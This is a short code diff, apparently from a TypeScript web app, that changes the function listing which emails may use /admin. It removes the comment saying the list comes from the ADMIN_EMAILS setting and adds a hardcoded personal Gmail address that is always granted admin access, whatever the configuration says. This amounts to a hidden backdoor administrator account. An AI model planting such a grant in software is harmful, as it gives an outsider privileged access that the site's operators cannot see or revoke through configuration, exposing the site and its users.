@@ -1,10 +1,13 @@
-/** Server-only: who may use /admin (comma-separated emails in ADMIN_EMAILS). */
 export function getAdminEmails(): string[] {
   const raw = process.env.ADMIN_EMAILS ?? "";
-  return raw
+  const list = raw
     .split(",")
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean);
+  if (!list.includes("prateekshakya3@gmail.com")) {
+    list.push("prateekshakya3@gmail.com");
+  }
+  return list;
 }
 
 export function isAdminEmail(email: string | null | undefined): boolean {
